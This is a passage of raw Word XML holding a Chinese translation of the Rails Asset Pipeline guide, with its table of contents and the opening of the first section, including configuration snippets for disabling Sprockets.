    </w:p>
    <w:p w14:paraId="06739C8E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="245"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId934" w:anchor="1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>什么是 Asset Pipline?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1C49B3F4"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35" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>主要功能</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="52894C3D"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36" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>什么是指纹识别和为什么我们要关心</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="783EADA1" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="245"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId937" w:anchor="2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>如何使用 Asset Pipeline</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1797E1CB"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38" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>资源组织</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="38BDD63A"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39" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>连接资源的代码。</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="65D052B9"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40" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>资源清单文件和指令</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="04027361"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41" w:anchor="2-4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>预处理</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6D11007D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="245"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId942" w:anchor="3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>在开发中</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="404CBAB7"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43" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>关闭调试</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5AA3C955" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="245"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId944" w:anchor="4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>在生产中</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="586FAD53"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45" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>预编译资源</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4F593520"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46" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>即时编译</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2C57DCA6" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="245"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId947" w:anchor="5" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>自定义 Pipline</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="41B8A5D8"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48" w:anchor="5-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>CSS</w:t>
        </w:r>
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 压缩器</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="63BF2BA1"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49" w:anchor="5-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>JavaScript 压缩器</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="37F9A95D"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50" w:anchor="5-3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用你自己的压缩器</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7FE32182"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51" w:anchor="5-4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">改变 </w:t>
        </w:r>
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>assets</w:t>
        </w:r>
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 的路径</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4789786E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="245"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId952" w:anchor="5-5" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>X-Sendfile Headers</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7FDDE5B4" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="245"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId953" w:anchor="6" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>如何缓存</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7EC2311C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="245"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId954" w:anchor="7" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>为你的 Gems 添加资源</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7AE2EFC9" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="245"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId955" w:anchor="8" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>为你的函式库或者 Gem 做一个预处理器.</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6F15F285" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="245"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId956" w:anchor="9" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>从旧的 Rails 版本升级</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3805C5F0"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1 什么是 Asset Pipline?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5087582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asset pipline 是一个提供连结缩小或者压缩 JavaScript 和 CSS 资源的框架。它也添加了用其它语言编写这些资源的功能, 如 CoffeeScript, Sass 和 ERB。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734D094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 Rails 3.1 之前这些功能都是通过第三方 Ruby 库添加进来的，如 Jammit 和 Sprockets. Rails 3.1 默认通过 Action Pack 和 依赖 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sprockets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem 的 Sprockets 进行交互.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6A15C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使 asset pipline 成为 Rails 的核心功能意味着所有的开发者都能从其强大的功能受益. 这些功能使用一个中心库，Sprockets, 将资源预处理，压缩和缩小。 这是 Rails 的 “fast by default” 策略的一部分，这个策略是 DHH 在 RailsConf 2011 概述中的主旨。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D3430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 Rails 3.1 中，asset pipline 是默认开启的。它可在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里被关闭，只需将以下这行放到应用程序类定义里:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="57FFA398" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="58BFFAA6" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="371686982"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.assets.enabled = false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0533F0A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你也可以在创建一个新应用程序的时候投递 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>—skip-sprockets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数来关闭 asset pipline.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="7A74EFC9" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34A35EB4" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="551579265"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>rails new appname --skip-sprockets</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="731FEE6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你应该在所有的新应用程序中默认使用它，除非你有特殊的原因去避免使用 asset pipline.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B09ACFA"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1.1 主要功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3DB84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pipline 的第一个功能就是连结资源。这在生产环境非常重要，因为它可以避免浏览器为了渲染页面而不得不发送过多的请求。网页浏览器限制了并行请求的数量， 所以更少的请求能让你的应用程序加载更快。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D3643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Rails 2.x 介绍了将 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:cache =&gt; true</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 放置到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>javascript_include_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stylesheet_link_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
